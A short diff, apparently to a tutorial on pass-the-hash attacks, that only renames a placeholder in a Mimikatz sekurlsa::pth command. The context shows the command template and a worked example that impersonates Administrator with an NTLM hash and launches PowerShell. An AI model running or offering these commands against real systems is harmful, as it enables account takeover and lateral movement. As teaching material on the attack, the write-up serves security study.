@@ -119,7 +119,7 @@ Let's recap what we needed to authenticate as a user:
 There are many ways to spawn a process as a new user, the quickest and most common is to use Mimikatz once again. Here's the syntax:
 
 ```
-mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<executable>
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<exe>
 
 EXAMPLE:
 mimikatz # sekurlsa::pth /user:Administrator /domain:targetnet.notso.pro /ntlm:007461b27da66eded419e8db22307c4f /run:powershell.exe
